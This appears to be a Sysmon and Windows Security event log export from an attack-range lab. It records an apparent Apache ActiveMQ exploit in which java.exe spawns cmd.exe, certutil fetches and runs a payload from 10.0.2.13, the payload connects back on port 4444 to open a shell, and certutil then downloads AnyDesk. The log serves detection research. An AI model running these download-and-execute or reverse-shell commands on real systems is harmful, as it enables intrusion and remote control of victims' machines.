{"preview":false,"result":{"_time":"2026-04-24T09:20:01.341+0400","source":"amq001_security.log","EventRecordID":"325120","_raw":"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-a5ba-3e3b0328c30d}'/><EventID>4688</EventID><Version>2</Version><Level>0</Level><Task>13312</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime='2026-04-24T09:20:01.3413399Z'/><EventRecordID>325120</EventRecordID><Correlation/><Execution ProcessID='4' ThreadID='6624'/><Channel>Security</Channel><Computer>EC2AMAZ-I41BETP.attackrange.local</Computer><Security/></System><EventData><Data Name='SubjectUserSid'>EC2AMAZ-I41BETP\\Administrator</Data><Data Name='SubjectUserName'>Administrator</Data><Data Name='SubjectDomainName'>EC2AMAZ-I41BETP</Data><Data Name='SubjectLogonId'>0x11c15c</Data><Data Name='NewProcessId'>0x181c</Data><Data Name='NewProcessName'>C:\\Windows\\System32\\cmd.exe</Data><Data Name='TokenElevationType'>%%1936</Data><Data Name='ProcessId'>0x1da0</Data><Data Name='CommandLine'></Data><Data Name='TargetUserSid'>NULL SID</Data><Data Name='TargetUserName'>-</Data><Data Name='TargetDomainName'>-</Data><Data Name='TargetLogonId'>0x0</Data><Data Name='ParentProcessName'>C:\\Program Files\\Java\\jdk-26.0.1\\bin\\java.exe</Data><Data Name='MandatoryLabel'>Mandatory Label\\High Mandatory Level</Data></EventData></Event>"}}
{"preview":false,"result":{"_time":"2026-04-24T09:20:01.348+0400","source":"amq001_sysmon.log","EventRecordID":"7134","_raw":"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-04-24T09:20:01.3488986Z'/><EventRecordID>7134</EventRecordID><Correlation/><Execution ProcessID='2976' ThreadID='3588'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>EC2AMAZ-I41BETP.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-04-24 09:20:01.341</Data><Data Name='ProcessGuid'>{0741354c-35c1-69eb-4b05-000000006702}</Data><Data Name='ProcessId'>6172</Data><Data Name='Image'>C:\\Windows\\System32\\cmd.exe</Data><Data Name='FileVersion'>10.0.20348.4647 (WinBuild.160101.0800)</Data><Data Name='Description'>Windows Command Processor</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>Cmd.Exe</Data><Data Name='CommandLine'>cmd.exe /c \"certutil -urlcache -f http://10.0.2.13:8080/2aXLOl2E_xIIBzjdZCjVVQ %%TEMP%%\\qSwUwejx.exe &amp; start /B %%TEMP%%\\qSwUwejx.exe\"</Data><Data Name='CurrentDirectory'>C:\\Users\\Administrator\\Downloads\\apache-activemq-5.18.1-bin\\apache-activemq-5.18.1\\</Data><Data Name='User'>EC2AMAZ-I41BETP\\Administrator</Data><Data Name='LogonGuid'>{0741354c-1bf4-69eb-5cc1-110000000000}</Data><Data Name='LogonId'>0x11c15c</Data><Data Name='TerminalSessionId'>2</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=F63068E624FE6B82058AAAA671D4BC96,SHA256=90D120880614E1E2A94067BAAD1454B09E2BE7A9DA51B71E33C247077D9F9538,IMPHASH=D60B77062898DC6BFAE7FE11A0F8806C</Data><Data Name='ParentProcessGuid'>{0741354c-3142-69eb-e404-000000006702}</Data><Data Name='ParentProcessId'>7584</Data><Data Name='ParentImage'>C:\\Program Files\\Java\\jdk-26.0.1\\bin\\java.exe</Data><Data Name='ParentCommandLine'>\"C:\\Program Files\\Java\\jdk-26.0.1\\bin\\java.exe\" -Dcom.sun.management.jmxremote -Xms1G -Xmx1G -Djava.util.logging.config.file=logging.properties -Djava.security.auth.login.config=C:\\Users\\Administrator\\Downloads\\apache-activemq-5.18.1-bin\\apache-activemq-5.18.1\\bin\\..\\conf\\login.config -Dactivemq.classpath=C:\\Users\\Administrator\\Downloads\\apache-activemq-5.18.1-bin\\apache-activemq-5.18.1\\bin\\..\\conf;C:\\Users\\Administrator\\Downloads\\apache-activemq-5.18.1-bin\\apache-activemq-5.18.1\\bin\\../conf;C:\\Users\\Administrator\\Downloads\\apache-activemq-5.18.1-bin\\apache-activemq-5.18.1\\bin\\../conf; -Dactivemq.home=C:\\Users\\Administrator\\Downloads\\apache-activemq-5.18.1-bin\\apache-activemq-5.18.1\\bin\\.. -Dactivemq.base=C:\\Users\\Administrator\\Downloads\\apache-activemq-5.18.1-bin\\apache-activemq-5.18.1\\bin\\.. -Dactivemq.conf=C:\\Users\\Administrator\\Downloads\\apache-activemq-5.18.1-bin\\apache-activemq-5.18.1\\bin\\..\\conf -Dactivemq.data=C:\\Users\\Administrator\\Downloads\\apache-activemq-5.18.1-bin\\apache-activemq-5.18.1\\bin\\..\\data -Djolokia.conf=file:C:\\\\Users\\\\Administrator\\\\Downloads\\\\apache-activemq-5.18.1-bin\\\\apache-activemq-5.18.1\\\\bin\\\\..\\\\conf\\\\jolokia-access.xml -Djava.io.tmpdir=C:\\Users\\Administrator\\Downloads\\apache-activemq-5.18.1-bin\\apache-activemq-5.18.1\\bin\\..\\data\\tmp -jar C:\\Users\\Administrator\\Downloads\\apache-activemq-5.18.1-bin\\apache-activemq-5.18.1\\bin\\../bin/activemq.jar start</Data><Data Name='ParentUser'>EC2AMAZ-I41BETP\\Administrator</Data></EventData></Event>"}}
{"preview":false,"result":{"_time":"2026-04-24T09:20:01.421+0400","source":"amq001_security.log","EventRecordID":"325122","_raw":"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-a5ba-3e3b0328c30d}'/><EventID>4688</EventID><Version>2</Version><Level>0</Level><Task>13312</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime='2026-04-24T09:20:01.4212267Z'/><EventRecordID>325122</EventRecordID><Correlation/><Execution ProcessID='4' ThreadID='6624'/><Channel>Security</Channel><Computer>EC2AMAZ-I41BETP.attackrange.local</Computer><Security/></System><EventData><Data Name='SubjectUserSid'>EC2AMAZ-I41BETP\\Administrator</Data><Data Name='SubjectUserName'>Administrator</Data><Data Name='SubjectDomainName'>EC2AMAZ-I41BETP</Data><Data Name='SubjectLogonId'>0x11c15c</Data><Data Name='NewProcessId'>0x1b88</Data><Data Name='NewProcessName'>C:\\Windows\\System32\\certutil.exe</Data><Data Name='TokenElevationType'>%%1936</Data><Data Name='ProcessId'>0x181c</Data><Data Name='CommandLine'></Data><Data Name='TargetUserSid'>NULL SID</Data><Data Name='TargetUserName'>-</Data><Data Name='TargetDomainName'>-</Data><Data Name='TargetLogonId'>0x0</Data><Data Name='ParentProcessName'>C:\\Windows\\System32\\cmd.exe</Data><Data Name='MandatoryLabel'>Mandatory Label\\High Mandatory Level</Data></EventData></Event>"}}
{"preview":false,"result":{"_time":"2026-04-24T09:20:01.477+0400","source":"amq001_sysmon.log","EventRecordID":"7135","_raw":"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-04-24T09:20:01.4771646Z'/><EventRecordID>7135</EventRecordID><Correlation/><Execution ProcessID='2976' ThreadID='3588'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>EC2AMAZ-I41BETP.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-04-24 09:20:01.421</Data><Data Name='ProcessGuid'>{0741354c-35c1-69eb-4d05-000000006702}</Data><Data Name='ProcessId'>7048</Data><Data Name='Image'>C:\\Windows\\System32\\certutil.exe</Data><Data Name='FileVersion'>10.0.20348.4767 (WinBuild.160101.0800)</Data><Data Name='Description'>CertUtil.exe</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>CertUtil.exe</Data><Data Name='CommandLine'>certutil  -urlcache -f http://10.0.2.13:8080/2aXLOl2E_xIIBzjdZCjVVQ C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\2\\qSwUwejx.exe </Data><Data Name='CurrentDirectory'>C:\\Users\\Administrator\\Downloads\\apache-activemq-5.18.1-bin\\apache-activemq-5.18.1\\</Data><Data Name='User'>EC2AMAZ-I41BETP\\Administrator</Data><Data Name='LogonGuid'>{0741354c-1bf4-69eb-5cc1-110000000000}</Data><Data Name='LogonId'>0x11c15c</Data><Data Name='TerminalSessionId'>2</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=0B25C6BB1E312AB02CFDC9EAA72D3C4E,SHA256=9BF54C3666926B43418C647BC70BE72A94CBDFF62091784AF626D4ACC163A98D,IMPHASH=02CB6949ACFAA0B84149D99111C16734</Data><Data Name='ParentProcessGuid'>{0741354c-35c1-69eb-4b05-000000006702}</Data><Data Name='ParentProcessId'>6172</Data><Data Name='ParentImage'>C:\\Windows\\System32\\cmd.exe</Data><Data Name='ParentCommandLine'>cmd.exe /c \"certutil -urlcache -f http://10.0.2.13:8080/2aXLOl2E_xIIBzjdZCjVVQ %TEMP%\\qSwUwejx.exe &amp; start /B %TEMP%\\qSwUwejx.exe\"</Data><Data Name='ParentUser'>EC2AMAZ-I41BETP\\Administrator</Data></EventData></Event>"}}
{"preview":false,"result":{"_time":"2026-04-24T09:20:01.919+0400","source":"amq001_sysmon.log","EventRecordID":"7136","_raw":"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-04-24T09:20:01.9192846Z'/><EventRecordID>7136</EventRecordID><Correlation/><Execution ProcessID='2976' ThreadID='3588'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>EC2AMAZ-I41BETP.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>EXE</Data><Data Name='UtcTime'>2026-04-24 09:20:01.918</Data><Data Name='ProcessGuid'>{0741354c-35c1-69eb-4d05-000000006702}</Data><Data Name='ProcessId'>7048</Data><Data Name='Image'>C:\\Windows\\system32\\certutil.exe</Data><Data Name='TargetFilename'>C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\2\\qSwUwejx.exe</Data><Data Name='CreationUtcTime'>2026-04-24 09:20:01.918</Data><Data Name='User'>EC2AMAZ-I41BETP\\Administrator</Data></EventData></Event>"}}
{"preview":false,"result":{"_time":"2026-04-24T09:20:01.930+0400","source":"amq001_security.log","EventRecordID":"325123","_raw":"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-a5ba-3e3b0328c30d}'/><EventID>4688</EventID><Version>2</Version><Level>0</Level><Task>13312</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime='2026-04-24T09:20:01.9303906Z'/><EventRecordID>325123</EventRecordID><Correlation/><Execution ProcessID='4' ThreadID='7440'/><Channel>Security</Channel><Computer>EC2AMAZ-I41BETP.attackrange.local</Computer><Security/></System><EventData><Data Name='SubjectUserSid'>EC2AMAZ-I41BETP\\Administrator</Data><Data Name='SubjectUserName'>Administrator</Data><Data Name='SubjectDomainName'>EC2AMAZ-I41BETP</Data><Data Name='SubjectLogonId'>0x11c15c</Data><Data Name='NewProcessId'>0x16bc</Data><Data Name='NewProcessName'>C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\2\\qSwUwejx.exe</Data><Data Name='TokenElevationType'>%%1936</Data><Data Name='ProcessId'>0x181c</Data><Data Name='CommandLine'></Data><Data Name='TargetUserSid'>NULL SID</Data><Data Name='TargetUserName'>-</Data><Data Name='TargetDomainName'>-</Data><Data Name='TargetLogonId'>0x0</Data><Data Name='ParentProcessName'>C:\\Windows\\System32\\cmd.exe</Data><Data Name='MandatoryLabel'>Mandatory Label\\High Mandatory Level</Data></EventData></Event>"}}
{"preview":false,"result":{"_time":"2026-04-24T09:20:01.931+0400","source":"amq001_sysmon.log","EventRecordID":"7137","_raw":"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-04-24T09:20:01.9313041Z'/><EventRecordID>7137</EventRecordID><Correlation/><Execution ProcessID='2976' ThreadID='3588'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>EC2AMAZ-I41BETP.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-04-24 09:20:01.930</Data><Data Name='ProcessGuid'>{0741354c-35c1-69eb-4e05-000000006702}</Data><Data Name='ProcessId'>5820</Data><Data Name='Image'>C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\2\\qSwUwejx.exe</Data><Data Name='FileVersion'>-</Data><Data Name='Description'>-</Data><Data Name='Product'>-</Data><Data Name='Company'>-</Data><Data Name='OriginalFileName'>-</Data><Data Name='CommandLine'>C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\2\\qSwUwejx.exe </Data><Data Name='CurrentDirectory'>C:\\Users\\Administrator\\Downloads\\apache-activemq-5.18.1-bin\\apache-activemq-5.18.1\\</Data><Data Name='User'>EC2AMAZ-I41BETP\\Administrator</Data><Data Name='LogonGuid'>{0741354c-1bf4-69eb-5cc1-110000000000}</Data><Data Name='LogonId'>0x11c15c</Data><Data Name='TerminalSessionId'>2</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=434782068B13EEBBB6E0C1364AEE5B3D,SHA256=F6A283B7CA0D665C7420C313C14A16ECF67EDE5DB0940177544F446B5D1DB10B,IMPHASH=C2D02FC98F1D75D7B9457468EC75DA0E</Data><Data Name='ParentProcessGuid'>{0741354c-35c1-69eb-4b05-000000006702}</Data><Data Name='ParentProcessId'>6172</Data><Data Name='ParentImage'>C:\\Windows\\System32\\cmd.exe</Data><Data Name='ParentCommandLine'>cmd.exe /c \"certutil -urlcache -f http://10.0.2.13:8080/2aXLOl2E_xIIBzjdZCjVVQ %TEMP%\\qSwUwejx.exe &amp; start /B %TEMP%\\qSwUwejx.exe\"</Data><Data Name='ParentUser'>EC2AMAZ-I41BETP\\Administrator</Data></EventData></Event>"}}
{"preview":false,"result":{"_time":"2026-04-24T09:20:03.309+0400","source":"amq001_sysmon.log","EventRecordID":"7144","_raw":"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-04-24T09:20:03.3092296Z'/><EventRecordID>7144</EventRecordID><Correlation/><Execution ProcessID='2976' ThreadID='3596'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>EC2AMAZ-I41BETP.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>Usermode</Data><Data Name='UtcTime'>2026-04-24 09:20:01.334</Data><Data Name='ProcessGuid'>{0741354c-35c1-69eb-4e05-000000006702}</Data><Data Name='ProcessId'>5820</Data><Data Name='Image'>C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\2\\qSwUwejx.exe</Data><Data Name='User'>EC2AMAZ-I41BETP\\Administrator</Data><Data Name='Protocol'>tcp</Data><Data Name='Initiated'>true</Data><Data Name='SourceIsIpv6'>false</Data><Data Name='SourceIp'>10.0.2.12</Data><Data Name='SourceHostname'>EC2AMAZ-I41BETP.attackrange.local</Data><Data Name='SourcePort'>50834</Data><Data Name='SourcePortName'>-</Data><Data Name='DestinationIsIpv6'>false</Data><Data Name='DestinationIp'>10.0.2.13</Data><Data Name='DestinationHostname'>ip-10-0-2-13.eu-west-1.compute.internal</Data><Data Name='DestinationPort'>4444</Data><Data Name='DestinationPortName'>-</Data></EventData></Event>"}}
{"preview":false,"result":{"_time":"2026-04-24T09:25:31.105+0400","source":"amq001_security.log","EventRecordID":"325150","_raw":"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-a5ba-3e3b0328c30d}'/><EventID>4688</EventID><Version>2</Version><Level>0</Level><Task>13312</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime='2026-04-24T09:25:31.1056638Z'/><EventRecordID>325150</EventRecordID><Correlation/><Execution ProcessID='4' ThreadID='284'/><Channel>Security</Channel><Computer>EC2AMAZ-I41BETP.attackrange.local</Computer><Security/></System><EventData><Data Name='SubjectUserSid'>EC2AMAZ-I41BETP\\Administrator</Data><Data Name='SubjectUserName'>Administrator</Data><Data Name='SubjectDomainName'>EC2AMAZ-I41BETP</Data><Data Name='SubjectLogonId'>0x11c15c</Data><Data Name='NewProcessId'>0xf1c</Data><Data Name='NewProcessName'>C:\\Windows\\System32\\cmd.exe</Data><Data Name='TokenElevationType'>%%1936</Data><Data Name='ProcessId'>0x16bc</Data><Data Name='CommandLine'></Data><Data Name='TargetUserSid'>NULL SID</Data><Data Name='TargetUserName'>-</Data><Data Name='TargetDomainName'>-</Data><Data Name='TargetLogonId'>0x0</Data><Data Name='ParentProcessName'>C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\2\\qSwUwejx.exe</Data><Data Name='MandatoryLabel'>Mandatory Label\\High Mandatory Level</Data></EventData></Event>"}}
{"preview":false,"result":{"_time":"2026-04-24T09:25:31.106+0400","source":"amq001_sysmon.log","EventRecordID":"7171","_raw":"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-04-24T09:25:31.1066781Z'/><EventRecordID>7171</EventRecordID><Correlation/><Execution ProcessID='2976' ThreadID='3588'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>EC2AMAZ-I41BETP.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-04-24 09:25:31.105</Data><Data Name='ProcessGuid'>{0741354c-370b-69eb-6905-000000006702}</Data><Data Name='ProcessId'>3868</Data><Data Name='Image'>C:\\Windows\\System32\\cmd.exe</Data><Data Name='FileVersion'>10.0.20348.4647 (WinBuild.160101.0800)</Data><Data Name='Description'>Windows Command Processor</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>Cmd.Exe</Data><Data Name='CommandLine'>C:\\Windows\\system32\\cmd.exe </Data><Data Name='CurrentDirectory'>C:\\Users\\Administrator\\Downloads\\apache-activemq-5.18.1-bin\\apache-activemq-5.18.1\\</Data><Data Name='User'>EC2AMAZ-I41BETP\\Administrator</Data><Data Name='LogonGuid'>{0741354c-1bf4-69eb-5cc1-110000000000}</Data><Data Name='LogonId'>0x11c15c</Data><Data Name='TerminalSessionId'>2</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=F63068E624FE6B82058AAAA671D4BC96,SHA256=90D120880614E1E2A94067BAAD1454B09E2BE7A9DA51B71E33C247077D9F9538,IMPHASH=D60B77062898DC6BFAE7FE11A0F8806C</Data><Data Name='ParentProcessGuid'>{00000000-0000-0000-0000-000000000000}</Data><Data Name='ParentProcessId'>5820</Data><Data Name='ParentImage'>-</Data><Data Name='ParentCommandLine'>-</Data><Data Name='ParentUser'>-</Data></EventData></Event>"}}
{"preview":false,"result":{"_time":"2026-04-24T09:26:50.378+0400","source":"amq001_security.log","EventRecordID":"325162","_raw":"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-a5ba-3e3b0328c30d}'/><EventID>4688</EventID><Version>2</Version><Level>0</Level><Task>13312</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime='2026-04-24T09:26:50.3785231Z'/><EventRecordID>325162</EventRecordID><Correlation/><Execution ProcessID='4' ThreadID='6264'/><Channel>Security</Channel><Computer>EC2AMAZ-I41BETP.attackrange.local</Computer><Security/></System><EventData><Data Name='SubjectUserSid'>EC2AMAZ-I41BETP\\Administrator</Data><Data Name='SubjectUserName'>Administrator</Data><Data Name='SubjectDomainName'>EC2AMAZ-I41BETP</Data><Data Name='SubjectLogonId'>0x11c15c</Data><Data Name='NewProcessId'>0xccc</Data><Data Name='NewProcessName'>C:\\Windows\\System32\\certutil.exe</Data><Data Name='TokenElevationType'>%%1936</Data><Data Name='ProcessId'>0xf1c</Data><Data Name='CommandLine'></Data><Data Name='TargetUserSid'>NULL SID</Data><Data Name='TargetUserName'>-</Data><Data Name='TargetDomainName'>-</Data><Data Name='TargetLogonId'>0x0</Data><Data Name='ParentProcessName'>C:\\Windows\\System32\\cmd.exe</Data><Data Name='MandatoryLabel'>Mandatory Label\\High Mandatory Level</Data></EventData></Event>"}}
{"preview":false,"result":{"_time":"2026-04-24T09:26:50.379+0400","source":"amq001_sysmon.log","EventRecordID":"7182","_raw":"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-04-24T09:26:50.3794015Z'/><EventRecordID>7182</EventRecordID><Correlation/><Execution ProcessID='2976' ThreadID='3588'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>EC2AMAZ-I41BETP.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-04-24 09:26:50.378</Data><Data Name='ProcessGuid'>{0741354c-375a-69eb-7505-000000006702}</Data><Data Name='ProcessId'>3276</Data><Data Name='Image'>C:\\Windows\\System32\\certutil.exe</Data><Data Name='FileVersion'>10.0.20348.4767 (WinBuild.160101.0800)</Data><Data Name='Description'>CertUtil.exe</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>CertUtil.exe</Data><Data Name='CommandLine'>certutil  -urlcache -split -f \"https://download.anydesk.com/AnyDesk.exe\" C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\2\\anydesk.exe</Data><Data Name='CurrentDirectory'>C:\\</Data><Data Name='User'>EC2AMAZ-I41BETP\\Administrator</Data><Data Name='LogonGuid'>{0741354c-1bf4-69eb-5cc1-110000000000}</Data><Data Name='LogonId'>0x11c15c</Data><Data Name='TerminalSessionId'>2</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=0B25C6BB1E312AB02CFDC9EAA72D3C4E,SHA256=9BF54C3666926B43418C647BC70BE72A94CBDFF62091784AF626D4ACC163A98D,IMPHASH=02CB6949ACFAA0B84149D99111C16734</Data><Data Name='ParentProcessGuid'>{0741354c-370b-69eb-6905-000000006702}</Data><Data Name='ParentProcessId'>3868</Data><Data Name='ParentImage'>C:\\Windows\\System32\\cmd.exe</Data><Data Name='ParentCommandLine'>C:\\Windows\\system32\\cmd.exe </Data><Data Name='ParentUser'>EC2AMAZ-I41BETP\\Administrator</Data></EventData></Event>"}}
{"preview":false,"result":{"_time":"2026-04-24T09:26:51.021+0400","source":"amq001_sysmon.log","EventRecordID":"7183","_raw":"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-04-24T09:26:51.0214438Z'/><EventRecordID>7183</EventRecordID><Correlation/><Execution ProcessID='2976' ThreadID='3588'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>EC2AMAZ-I41BETP.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>EXE</Data><Data Name='UtcTime'>2026-04-24 09:26:51.020</Data><Data Name='ProcessGuid'>{0741354c-375a-69eb-7505-000000006702}</Data><Data Name='ProcessId'>3276</Data><Data Name='Image'>C:\\Windows\\system32\\certutil.exe</Data><Data Name='TargetFilename'>C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\2\\anydesk.exe</Data><Data Name='CreationUtcTime'>2026-04-24 09:26:51.020</Data><Data Name='User'>EC2AMAZ-I41BETP\\Administrator</Data></EventData></Event>"},"lastrow":true}
